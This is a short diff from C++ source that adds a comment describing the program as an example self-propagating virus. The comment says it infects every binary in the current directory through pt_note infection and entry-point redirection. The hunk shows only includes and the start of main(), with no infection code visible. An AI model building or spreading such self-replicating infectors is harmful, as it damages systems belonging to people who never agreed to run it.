@@ -6,6 +6,10 @@
 #include "propagation/propagate.hh"
 #include "redirection/entry_point.hh"
 
+// An example self propagating virus that is able to copies itself into all
+// binaries within the current directory using the pt_note infection algorithm
+// and entry point redirection. When any infected host is run, it spreads
+// itself like a virus where permission allows.
 int main(int argc, char* argv[], char* env[]) {
   const char* quote1 = STR_LITERAL(
       "If debugging is the process of removing software bugs, then programming "
